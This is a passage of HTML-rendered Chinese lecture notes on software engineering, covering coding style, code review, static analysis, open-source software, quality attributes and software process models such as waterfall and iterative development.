id="%EF%BC%881%EF%BC%89%E7%A8%8B%E5%BA%8F%E8%B4%A8%E9%87%8F%E7%9A%84%E8%AF%AD%E6%B3%95%E5%92%8C%E8%AF%AD%E4%B9%89%E4%BD%93%E7%8E%B0" tabindex="-1">（1）程序质量的语法和语义体现</h4><ul><li>代码风格规范-语法<ul><li>语法和结构层次</li><li>明确如何来规范程序的书写</li><li>表现为是否易于阅读和理解</li></ul></li><li>代码设计规范-语义<ul><li>语义和内涵层次，外在的</li><li>明确如何来组织和封装程序语句</li><li>表现为良好的结构和易于重用</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E9%81%B5%E5%BE%AA%E7%BC%96%E7%A0%81%E9%A3%8E%E6%A0%BC" tabindex="-1">（2）遵循编码风格</h4><ul><li>良好的编程行为：对代码符号进行良好的组织、合理的命名、提供必要的注释，那么将可增强代码的可读性和可理解性，进而提高代码的可维护性和可重用性，提升代码的内部质量</li><li>编码风格：程序员在编码时要遵循特定的样式及要求，以规范程序员的编程行为以及所产生程序代码的样式</li><li>编写代码的基本原则<ul><li>易懂，一看就懂</li><li>简明，降低复杂度</li><li>易改，便于维护</li><li>无二义，不产生歧义</li></ul></li><li>代码风格举例：<ul><li>代码布局：缩进，大括号换行</li><li>代码组织：按字母顺序说明对象，单入口单出口</li><li>命名规范：一看就懂，望文生义；小驼峰，大驼峰</li><li>代码注释：有效、必要、简洁的注释；注解位置</li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E9%87%87%E7%94%A8%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%96%B9%E6%B3%95" tabindex="-1">（3）采用程序设计方法</h4><ul><li>语句设计<ul><li>单入口单出口，少用goto语句</li><li>加强对异常处理<ul><li>将更多的时间和精力放在处理异常代码上</li></ul></li></ul></li><li>模块化设计<ul><li>模块是逻辑上相对独立、具有良定义接口的编程单位</li><li>模块可表现为函数、过程、方法、类、程序包等</li></ul></li><li>高内聚低耦合原则<ul><li>高内聚：模块内各要素紧密相关，仅实现单一功能，否则再进行拆分</li><li>低耦合：模块间的关系应设计的非常松散</li></ul></li></ul><h4 id="%EF%BC%884%EF%BC%89%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8" tabindex="-1">（4）代码重用</h4><p>定义：在编写代码过程中，充分利用已有和现成的代码，并将其集成到程序之中，从而来实现程序功能<br>好处：由于被重用的代码经过多次反复的使用，代码质量得到充分检验，因而代码重用不仅可极大提高编程效率，而且还可有效提高程序质量</p><ul><li>重用代码片段</li><li>重用函数、类和软构件</li><li>重用开源代码</li></ul><h4 id="%EF%BC%885%EF%BC%89%E7%BB%93%E5%AF%B9%E7%BC%96%E7%A8%8B" tabindex="-1">（5）结对编程</h4><h3 id="3-%E7%A8%8B%E5%BA%8F%E8%B4%A8%E9%87%8F%E7%9A%84%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95" tabindex="-1">3 程序质量的分析方法</h3><ul><li>人工审查方法</li><li>自动化分析方法</li><li>程序测试方法</li></ul><h4 id="%EF%BC%881%EF%BC%89%E7%A8%8B%E5%BA%8F%E4%BB%A3%E7%A0%81%E4%B8%AD%E6%BD%9C%E5%9C%A8%E7%9A%84%E8%B4%A8%E9%87%8F%E9%97%AE%E9%A2%98" tabindex="-1">（1）程序代码中潜在的质量问题</h4><ul><li>质量问题<ul><li>编写不合理 – 没有遵循编码规范</li><li>设计不合理 – 没有遵循设计规范</li><li>代码有错误 – 代码编写的不正确</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E4%BA%BA%E5%B7%A5%E5%AE%A1%E6%9F%A5%E4%BB%A3%E7%A0%81%EF%BC%88code-review%EF%BC%89" tabindex="-1">（2）人工审查代码（Code Review）</h4><ul><li>方法描述:阅读和理解代码；发现缺陷和问题；提出改进的建议</li><li>方法特点：人工审查效率低；难以发现一些深层次问题；难以全面地进行系统分析</li><li>审查方面：<ul><li>代码是否符合编程规范</li><li>代码中是否存在缺陷</li><li>从质量的角度哪些代码需要改进</li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7%E5%AE%A1%E6%9F%A5-%E4%BB%A3%E7%A0%81%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90" tabindex="-1">（3）自动化工具审查-代码静态分析</h4><ul><li><p>由计算机软件来自动完成代码审查</p><ul><li>无需运行被测代码，仅通过分析或检查程序的语法、结构、过程、接口等来检查程序</li><li>30% - 70% 的代码缺陷可通过静态分析发现</li></ul></li><li><p>分析什么</p><ul><li>找出代码隐藏的错误和缺陷，如参数不匹配，有歧义的嵌套语句，错误的递归，非法计算，可能出现的空指针引用等等</li><li>程序遵循编码规范的程度</li></ul></li><li><p>特点：快速定位、有效发现隐藏的错误和缺陷</p></li><li><p>自动化代码分析工具：SonarQube</p><ul><li>基于Web、用于管理程序代码质量的代码分析工具</li><li><a href="http://www.sonarqube.org">www.sonarqube.org</a></li><li>能以插件的形式集成到众多的软件开发环境（如Eclipse）</li></ul></li></ul><h4 id="%EF%BC%884%EF%BC%89%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E6%8A%80%E6%9C%AF" tabindex="-1">（4）软件测试技术</h4><ul><li>程序本质上是对数据的处理</li><li>设计数据(测试用例) -&gt; 运行测试用例(程序来处理数据) -&gt; 判断运行结果(是否符合预期结果)</li></ul><h3 id="4-%E4%BD%95%E4%B8%BA%E8%BD%AF%E4%BB%B6%E5%8F%8A%E8%BD%AF%E4%BB%B6%E7%9A%84%E7%89%B9%E7%82%B9" tabindex="-1">4 何为软件及软件的特点</h3><h4 id="%EF%BC%881%EF%BC%89%E4%BD%95%E4%B8%BA%E8%BD%AF%E4%BB%B6" tabindex="-1">（1）何为软件</h4><ul><li>软件是指在计算机系统的支持下，能够完成特定功能与性能的<strong>程序、数据和文档</strong><ul><li>文档：记录软件开发活动和阶段性成果、软件配置及变更的阐述性资料<ul><li>定义和理解软件</li><li>记录软件开发成果</li><li>辅助不同人员间的交流</li></ul></li><li>数据：程序的加工处理对象和结果<ul><li>数据形式：用户，订单，交易，日志</li><li>数据处理：表示，获取，存储，检索，分析</li></ul></li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E8%BD%AF%E4%BB%B6%E6%A6%82%E5%BF%B5%E7%BB%99%E6%88%91%E4%BB%AC%E7%9A%84%E5%90%AF%E7%A4%BA" tabindex="-1">（2）软件概念给我们的启示</h4><ul><li>软件<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≠</mo><mrow></mrow></mrow><annotation encoding="application/x-tex">\not ={}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0em;"></span><span class="mord"></span></span></span></span></eq>程序<ul><li>软件涉及更多制品</li><li>这些制品间有关联、相互依赖</li></ul></li><li>开发软件   <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≠</mo><mrow></mrow></mrow><annotation encoding="application/x-tex">\not ={}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0em;"></span><span class="mord"></span></span></span></span></eq>      编写程序<ul><li>软件开发需要做更多事情</li><li>对软件提出更高的要求</li></ul></li><li>软件的规模和复杂性意味着要采用行之有效的方法—工程方法</li></ul><h4 id="%EF%BC%883%EF%BC%89%E8%BD%AF%E4%BB%B6%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F" tabindex="-1">（3）软件生命周期</h4><ul><li>a 需求分析</li><li>b 软件设计</li><li>c 编码实现</li><li>d 软件测试</li><li>e 部署运行</li><li>f 使用维护</li><li>转a</li></ul><h4 id="%EF%BC%884%EF%BC%89%E8%BD%AF%E4%BB%B6%E7%89%B9%E7%82%B9" tabindex="-1">（4）软件特点</h4><ul><li>逻辑性：逻辑产品，逻辑思维（非物理活动）的结果、不会磨损和老化</li><li>设计开发：是设计开发而成的，不是生产制造而成的，而是一系列以设计为核心的软件开发活动</li><li>易变性：需求经常变、难以把控，影响软件的制品即开发过程；产品难以成熟</li><li>复杂性：规模大；运行复杂；环境复杂；</li><li>缺陷的隐蔽性：缺陷隐藏在逻辑代码中，不像硬件系统那样直观显现，很难被人们所发现和排除</li></ul><h3 id="5-%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%88%86%E7%B1%BB" tabindex="-1">5 软件的分类</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%88%86%E7%B1%BB" tabindex="-1">（1）软件的分类</h4><ul><li><p>应用软件</p><ul><li>面向特定应用领域的专用软件。它们针对相关行业和领域的特定问题，为其提供基于计算的新颖解决方案。</li><li>示例：淘宝、12306、携程、微信、QQ等软件</li></ul></li><li><p>系统软件</p><ul><li>对计算机资源进行管理，为应用软件的运行提供基础设施和服务的一类软件。从计算服务的视角，系统软件介于计算机硬件和应用软件之间。</li><li>示例：操作系统、数据库管理系统、编译软件、软件中间件等</li></ul></li><li><p>支撑软件</p><ul><li>辅助软件开发和运维，帮助开发人员完成软件开发和维护工作的一类软件</li><li>示例：SonarQube、Visual Studio、Eclipse等</li></ul></li><li><p>通用软件产品</p><ul><li>由软件开发组织开发的，在市场上公开销售，可以独立使用的软件.</li><li>关于产品应该做什么的规格说明由开发者确定，相关的变更决策也由开发者做出.</li></ul></li><li><p>定制化软件产品</p><ul><li>受特定客户委托，由软件开发商针对特定客户需求专门设计和实现的软件.</li><li>关于产品应该做什么的规格说明由客户给出，相关的变更需求也由客户提出.</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E9%97%AD%E6%BA%90%E8%BD%AF%E4%BB%B6" tabindex="-1">（2）闭源软件</h4><ul><li>何为闭源软件<ul><li>软件代码不对用户开放的一类软件，购买软件时只提供可运行软件或服务，没有提供源代码</li><li>以许可证（License）的方式授权用户使用软件</li></ul></li><li>闭源软件带来的问题<ul><li>无法掌握软件内部实现情况（如是否存在安全漏洞和恶意代码），也无法对软件进行修改和完善，极大影响了开发者的创新自由</li></ul></li><li>示例<ul><li>微软的Windows、Office软件，</li><li>典型企业：微软、IBM、Oracle等</li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6" tabindex="-1">（3）开源软件</h4><ul><li>何为开源软件<ul><li>一种源代码可以自由获取和传播的计算机软件，其拥有者通过开源许可证赋予被许可人对软件进行使用、修改和传播</li></ul></li><li>开源软件的好处<ul><li>源代码可自由传播</li><li>激发创作者的热情</li><li>免费使用降低成本</li></ul></li><li>示例：开源软件<ul><li>Linux, Ubuntu</li><li>Apache, Jboss, Tomcat</li></ul></li></ul><h4 id="%EF%BC%884%EF%BC%89%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6%E6%89%98%E7%AE%A1%E5%B9%B3%E5%8F%B0" tabindex="-1">（4）开源软件托管平台</h4><ul><li>Github：全球最有影响力的开源软件托管平台</li><li>SourceForge：一个有影响力的开源软件开发平台和仓库，为开源软件提供存储、协作和发布的支持</li><li>Gitee：中国的开源软件托管平台</li><li>Stack Overflow：全球最大的软件开发知识分享平台，它支持开发者交流和讨论软件开发问题、分享软件开发经验和知识，进而促进相关开发问题的解决，推动开源软件的开发</li></ul><h4 id="%EF%BC%885%EF%BC%89%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6%E7%9A%84%E4%BC%98%E5%8A%BF" tabindex="-1">（5）开源软件的优势</h4><ul><li><p>采购和开发的成本更低</p><ul><li>开源软件通常是免费的，即使要付费，其费用也非常低廉</li></ul></li><li><p>软件质量更高、更安全</p><ul><li>核心代码都在公众的视野之中，代码问题（如缺陷、安全漏洞等）很容易被人发现</li></ul></li><li><p>软件研制和交付的更快</p><ul><li>基于开源软件的项目开发可以更为快速地给用户交付软件产品</li></ul></li><li><p>软件功能更为强大</p><ul><li>大量的软件开发者不仅参与软件开发，贡献他们的代码，而且还参与软件的创新，提出和构思软件需求，不断完善软件功能</li></ul></li><li><p>开源软件许可证</p><ul><li>何为开源许可证<ul><li>声明获得开源代码后拥有的权利，界定对别人的开源作品进行何种操作、何种操作是被禁止的，规范开源软件的使用要求和约束</li><li>开发者虽然可自由地获取开源软件的源代码，但在如何使用开源软件方面还需要遵循相关的开源软件协议</li></ul></li><li>二类许可证<ul><li>宽松式开源许可证：三方面特点：代码使用没有任何限制；用户自担代码质量的风险；用户使用开源软件时须披露原始作者</li><li>Copyleft式开源许可证：更多限制，带有许多条件和要求，比如分发二进制代码时须提供源代码，修改后的开源软件须与之前保持一致的许可证等</li></ul></li></ul></li></ul><h4 id="%EF%BC%886%EF%BC%89%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8" tabindex="-1">（6）开源软件的利用</h4><ul><li>学习开源软件<ul><li>不仅反映了核心开发者的软件技术和功能创意，而且还蕴含了高水平的软件开发技能，如架构设计、编码风格、模块封装等</li></ul></li><li>重用开源代码<ul><li>开源软件构成了支撑软件开发的可重用软件资源库，可实现更大粒度的软件重用</li></ul></li><li>参与开源建设，掌握开源技术，理解开源文化<ul><li>包括反馈软件缺陷、提出软件需求、讨论问题的解决、贡献程序代码等等</li></ul></li><li>重用和集成开源软件来快速搭建高质量的系统</li></ul><h3 id="6-%E8%BD%AF%E4%BB%B6%E8%B4%A8%E9%87%8F" tabindex="-1">6 软件质量</h3><ul><li>软件质量是指软件满足给定需求的程度，它是产品生命线</li><li>正确性（Correctness）：软件满足规格说明和用户要求的程度，即在预定环境下能正确地完成预期功能和非功能需求的程度。</li><li>可靠性（Reliability）：在规定条件下、限定时间范围内，软件系统完成预期功能、不引起系统故障的能力。</li><li>健壮性（Robustness）：在计算环境发生故障、输入无效数据或操作错误等意外情况下，软件仍能做出适当响应的程度。</li><li>有效性（Efficiency）：软件利用计算资源和存储资源以实现其功能的能力</li><li>安全性：包括系统安全（Safety）和信息安全（Security），系统安全是指软件能及时有效地避免给人员、设施、环境、经济等造成损害，信息安全是指软件能有效防控各类的非法获取、传播和使用</li><li>可维护性（Maintainability）：是否易于对其进行修改以更正错误、增强功能、适应新运行环境</li><li>可移植性（Portability）：把软件从一种运行环境转移到另一种运行环境下运行的难易程度</li><li>可重用性（Reusability）：软件模块、构件、设计方案等在其他软件开发中被再次使用程度</li><li>可理解性（Comprehensibility）：软件开发者或用户理解该软件系统的容易程度</li><li>可信性（Dependability）：采取有效措施确认软件满足人们的要求和期望</li><li>持续性（Sustainability）：面对各种突发异常事件，仍能提供令人满意的服务的能力</li><li>可用性（Usability）：使用和操作软件系统难以程度</li><li>互操作性（Interoperability）：软件系统与其他的系统进行交换信息、协同工作的能力</li></ul><h2 id="%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%A6%82%E8%BF%B0" tabindex="-1">第二章 软件工程概述</h2><h3 id="1-%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%BA%A7%E7%94%9F%E8%83%8C%E6%99%AF" tabindex="-1">1 软件工程产生背景</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BD%AF%E4%BB%B6%E5%8D%B1%E6%9C%BA%E7%9A%84%E5%87%BA%E7%8E%B0" tabindex="-1">（1）软件危机的出现</h4><ul><li>进度经常延迟</li><li>质量无法保证</li><li>成本超出预算</li><li>软件维护困难</li><li>失败风险很大</li></ul><h4 id="%EF%BC%882%EF%BC%89%E5%A6%82%E4%BD%95%E6%9D%A5%E8%A7%A3%E5%86%B3%E8%BD%AF%E4%BB%B6%E5%8D%B1%E6%9C%BA%3F" tabindex="-1">（2）如何来解决软件危机?</h4><ul><li>软件危机根源<ul><li>对软件这样一类复杂和特殊系统的认识不清：软件是新生事物，对其特点、规律性和复杂性认识不够</li><li>没有找到支持软件系统开发的有效方法：基础理论、关键技术、开发过程、支撑工具等</li><li>缺乏成功软件开发实践以及相应的开发经验：系统总结、认真分析、充分借鉴、吸取教训</li></ul></li><li>软件开发迫切需要理论和方法指导，软件工程应运而生</li></ul><h3 id="2-%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%9F%BA%E6%9C%AC%E5%86%85%E6%B6%B5" tabindex="-1">2 软件工程基本内涵</h3><h4 id="%EF%BC%881%EF%BC%89%E4%BD%95%E4%B8%BA%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B" tabindex="-1">（1）何为软件工程</h4><ul><li><p>将系统的、规范的、可量化的方法应用于软件的开发、运行和维护的过程；以及上述方法的研究</p><ul><li>系统化：提供完整和全面的解决方法，包括目标、原则、过程模型、开发活动、开发方法和技术等</li><li>规范化：支持各类软件系统的开发，包括语言标准、质量标准、编程标准、方法标准、能力极其改进标准等</li><li>可量化：工作量、成本、进度、质量等要素可以量化，基于定量的数据支持开发和管理，确保科学性和可行性</li></ul></li><li><p>软件工程对软件开发的新认识</p><ul><li>软件是产品(Product)：面向用户，存在质量、成本、利润等特征</li><li>软件开发是一项工程(Project)：存在约束，需要质量保证，进行组织管理，…</li><li>要按工程化方法来组织软件生产<ul><li>分阶段分步骤来实施</li><li>按计划开展开发活动</li><li>进行各种形式质量保证</li><li>采用行之有效的方法</li><li>借助各种工具的支持…</li></ul></li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E4%B8%89%E8%A6%81%E7%B4%A0" tabindex="-1">（2）软件工程三要素</h4><p><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/2_3_0.jpg" alt></p><ul><li>过程<ul><li>从管理的视角，回答软件开发、运行和维护需要开展哪些工作、按照什么样的步骤和次序来开展工作</li><li>对软件开发过程所涉及的人、制品、质量、成本、计划等进行有效和可量化的管理</li><li>典型成果<ul><li>过程模型，如瀑布模型、增量模型、原型模型、迭代模型、螺旋模型等等</li><li>方法，如敏捷开发方法、群体化开发方法、DevOps方法</li><li>管理，如配置管理、质量管理、团队组织等</li></ul></li></ul></li><li>方法学(Methodology)<ul><li>从技术的视角，回答软件开发、运行和维护如何做的问题</li><li>为软件开发过程中的各项开发和维护活动提供系统性、规范性的技术支持<ul><li>如何理解和认识软件模型是什么</li><li>如何用不同抽象层次的模型来描述软件制品</li><li>采用什么样的建模语言来描述软件模型等等</li></ul></li><li>典型成果<ul><li>结构化软件开发方法学</li><li>面向对象软件开发方法学</li><li>基于构件的软件开发方法学</li></ul></li></ul></li><li>工具<ul><li>从工具辅助的视角，主要回答如何借助工具来辅助软件开发、运行和维护的问题</li><li>帮助软件开发人员更为高效地运用软件开发方法学来完成软件开发过程中的各项工作，提高软件开发效率和质量，加快软件交付进度。<ul><li>如需求分析、软件设计、编码实现、软件测试、部署运行、软件维护、项目管理、质量保证等，简化软件开发任务，</li></ul></li><li>典型成果：SonarQube、Eclipse等</li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BE%85%E5%8A%A9%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B" tabindex="-1">（3）计算机辅助软件工程</h4><ul><li>什么是计算机辅助软件工程(Computer-Aided Software Engineering, CASE)<ul><li>在软件工程活动中，开发人员按照软件工程的方法和原则，借助于计算机及其软件的帮助来开发、维护和管理软件产品的过程</li></ul></li><li>CASE工具：支持CASE的软件工具，如编辑器、编译器等</li><li>CASE环境：<ul><li>将CASE工具按统一标准和接口组装起来，使工具间、人员间、各个过程间能方便交互的集成环境</li><li>如Visual Studio将编辑、编译、调试、界面设计、安装程序生成等等集成在一起</li></ul></li><li>代码编写，项目管理，软件建模，软件测试，软件运维</li></ul><h4 id="%EF%BC%884%EF%BC%89%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E7%9A%84%E6%9C%AC%E8%B4%A8" tabindex="-1">（4）软件开发的本质</h4><ul><li>软件开发 = 软件创作 + 软件生产</li><li>软件创作：基于软件开发者的经验和技能，借助于智慧，进行自由创新，如软件设计、编码实现等</li><li>软件生产：基于工程化的手段，遵循约束和规范，开展软件生产，如遵循过程、按照标准、质量保证等</li></ul><h4 id="%EF%BC%885%EF%BC%89%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E7%9A%84%E7%9B%AE%E6%A0%87" tabindex="-1">（5）软件工程的目标</h4><p>在成本、进度等约束下，指导软件开发和运维，开发出满足用户要求的足够好软件</p><h4 id="%EF%BC%886%EF%BC%89%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%8E%9F%E5%88%99" tabindex="-1">（6）软件工程原则</h4><ul><li>抽象与建模<ul><li>抽象：将与相关开发活动所关注的要素提取出来，不关心的要素扔掉，形成与该开发活动相关的软件要素</li><li>建模：基于特定的抽象，借助于建模语言（如数据流图、UML等），建立起基于这些抽象的软件模型，进而促进对软件系统的准确理解</li></ul></li><li>模块化<ul><li>将软件系统的功能分解和实现为若干个模块，每个模块具有独立的功能，模块之间通过接口进行调用和访问。</li></ul></li><li>软件重用<ul><li>在软件开发过程中尽可能利用已有的软件资源和资产（如函数库、类库、构件库、开源软件、代码片段等）来实现软件系统</li><li>努力开发出可被再次重用的软件资源（如函数、类、构件等）</li><li>有助于提高软件开发效率，降低软件开发成本，满足开发工程约束，得到高质量的软件产品</li></ul></li><li>信息隐藏<ul><li>模块内部信息（如内部的语句、变量等）对外不可见或不可访问，模块间仅仅交换那些为完成系统功能所必需交换的信息（如接口）</li><li>模块设计时只对外提供可见的接口，不提供内部实现细节。信息隐藏原则可提升模块的独立性，减少错误向外传播，支持模块的并行开发</li></ul></li><li>关注点分离</li><li>分而治之</li><li>双向追踪原则<ul><li>当某个软件制品发生变化时，一方面要追踪这种变化会对那些软件制品产生影响，进而指导相关的开发和维护工作，此为正向追踪；另一方面要追踪产生这种变化的来源，或者说是什么因素导致了该软件制品的变化，明确软件制品发生变化的原因及其合理性，此为反向追踪。</li></ul></li><li>工具辅助</li></ul><h2 id="%E7%AC%AC%E4%B8%89%E7%AB%A0-%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%92%8C%E5%BC%80%E5%8F%91%E6%96%B9%E6%B3%95" tabindex="-1">第三章 软件工程和开发方法</h2><h3 id="1-%E4%BD%95%E4%B8%BA%E8%BD%AF%E4%BB%B6%E8%BF%87%E7%A8%8B%E6%A8%A1%E5%9E%8B" tabindex="-1">1 何为软件过程模型</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BD%AF%E4%BB%B6%E8%BF%87%E7%A8%8B" tabindex="-1">（1）软件过程</h4><ul><li>过程(Process)<ul><li>活动：明确要做哪些事情，包括具体的活动</li><li>关系：活动间存在逻辑关系，如依赖和先后次序</li></ul></li><li>软件过程：<ul><li>按照项目进度、成本和质量要求，遵循用户需求，开发和维护软件、管理软件项目的一系列有序软件开发活动</li><li>软件开发活动：技术活动和管理活动</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E8%BD%AF%E4%BB%B6%E8%BF%87%E7%A8%8B%E6%A8%A1%E5%9E%8B" tabindex="-1">（2）软件过程模型</h4><ul><li>定义了软件开发的具体活动以及活动间的逻辑关系</li><li>描述包括：<ul><li>过程中的活动以及这些活动的顺序</li><li>产品交付物：软件过程活动的产出物;</li><li>角色：反映了参与过程的人在其中的职责;</li><li>前置条件和后置条件：在一个过程活动执行之前和之后，或者产品生产之前和之后必须满足的条件。</li><li>工具</li><li>资源</li></ul></li></ul><h3 id="2-%E6%9C%89%E5%93%AA%E4%BA%9B%E8%BD%AF%E4%BB%B6%E8%BF%87%E7%A8%8B%E6%A8%A1%E5%9E%8B" tabindex="-1">2 有哪些软件过程模型</h3><ul><li>瀑布模型</li><li>增量模型</li><li>迭代模型</li><li>原型模型</li><li>螺旋模型</li><li>基于构件的过程模型</li><li>UP模型</li></ul><h4 id="%EF%BC%881%EF%BC%89%E7%80%91%E5%B8%83%E6%A8%A1%E5%9E%8B" tabindex="-1">（1）瀑布模型</h4><ul><li>步骤<ol><li><strong>需求分析</strong></li></ol><ul><li>活动<ul><li>任务：定义软件需求，包括功能、非功能需求</li><li>层次和视角：用户角度，仅描述问题和需求</li></ul></li><li>方法<ul><li>依据：用户的期望和要求</li><li>不断与用户进行交流和商讨，抽象、问题分解、多视点等技术</li></ul></li><li>产出：软件需求模型；软件需求文档；软件确认测试计划；</li></ul><ol start="2"><li><strong>概要设计</strong></li></ol><ul><li>活动<ul><li>任务：建立软件总体架构、制定集成测试计划</li><li>层次和视角：宏观、全局、整体、战略性</li></ul></li><li>方法<ul><li>依据：软件需求文档</li><li>自顶向下, 逐步求精,  抽象, 模块化, 局部化，信息隐藏</li></ul></li><li>产出：软件概要设计模型、软件概要设计文档、软件集成测试计划</li></ul><ol start="3"><li><strong>详细设计</strong></li></ol><ul><li>活动<ul><li>任务：设计模块内部细节(算法、数据结构)，制订单元测试计划</li><li>层次和视角：微观、局部、细节性</li></ul></li><li>方法<ul><li>依据：概要设计文档、软件需求文档</li><li>高质量的软件设计原则，如单入口单出口</li></ul></li><li>产出：软件详细设计模型、软件详细设计文档、单元测试计划</li></ul><ol start="4"><li><strong>编码实现</strong></li></ol><ul><li>活动<ul><li>任务：编写程序代码并进行单元测试和调试</li><li>层次和视角：最终的实现代码</li></ul></li><li>方法<ul><li>依据：软件概要和详细设计文档、单元测试计划</li><li>采用某种程序设计语言(如C、C++、Java)</li></ul></li><li>产出：经过单元测试的源程序代码</li></ul><ol start="5"><li><strong>集成测试</strong></li></ol><ul><li>活动<ul><li>任务：组装软件模块并进行测试以发现问题</li><li>层次和视角：系统结构、接口</li></ul></li><li>方法<ul><li>依据：软件概要设计文档、软件集成测试计划</li><li>软件集成测试工具</li></ul></li><li>产出：经过集成测试、修复缺陷的源程序代码，集成测试报告</li></ul><ol start="6"><li><strong>确认测试</strong></li></ol><ul><li>活动<ul><li>任务：测试软件是否满足用户需求</li><li>层次和视角：从用户角度，聚焦需求是否得以正确实现</li></ul></li><li>方法<ul><li>依据：软件确认测试计划、软件需求文档</li><li>软件测试支撑工具</li></ul></li><li>产出：经过确认测试、修复缺陷后的代码，软件确认测试报告</li></ul></li><li>特点：<ul><li>与软件生命周期相互一致</li><li>每个活动结束后需要评审</li><li>相邻活动间存在因果关系</li></ul></li><li>优点：简单，一目了然，易理解、掌握、应用和管理</li><li>缺点：违背现实</li><li>适用于需求易于定义、不易变动的软件系统</li><li>改进的瀑布模型：带反馈和回溯</li></ul><h4 id="%EF%BC%882%EF%BC%89%E5%A2%9E%E9%87%8F%E6%A8%A1%E5%9E%8B" tabindex="-1">（2）增量模型</h4><p><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/3_2_4.jpg" alt></p><ul><li>优点：渐进快速交付，并行开发，提高效率</li><li>不足：<ul><li>要求一开始完整确定需求，建立系统架构的要求更高</li><li>管理复杂，增量开发，要保持多个版本的制品一致性</li><li>产品是慢慢成熟的，跟办事规程不匹配</li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E8%BF%AD%E4%BB%A3%E6%A8%A1%E5%9E%8B(iterative-model)" tabindex="-1">（3）迭代模型(Iterative Model)</h4><p><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/3_2_5.jpg" alt></p><ul><li>优点：<ul><li>每次迭代是一完整过程</li><li>体现了小步快跑的开发理念，降低风险</li><li>适合需求难导出、不甚明确且持续变动的软件</li></ul></li><li>不足<ul><li>迭代多少次不确定</li><li>管理较为复杂</li><li>高素质管理者和团队</li></ul></li></ul><h4 id="%EF%BC%884%EF%BC%89%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%9E%8B(prototype-model)" tabindex="-1">（4）原型模型(Prototype Model)</h4><p><img src="/images/%E6%9C%AC%E7%A7%91/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB/3_2_6.jpg" alt></p><ul><li>软件原型:用户界面+执行流程</li><li>特点<ul><li>软件原型作为交流载体和媒介</li><li>支持用户参与到软件开发中</li><li>持续、渐进地导出用户要求</li></ul></li><li>适合于需求难导出、模糊且不易确定的软件</li></ul><h4 id="%EF%BC%885%EF%BC%89%E8%9E%BA%E6%97%8B%E6%A8%A1%E5%9E%8B(spiral-model)" 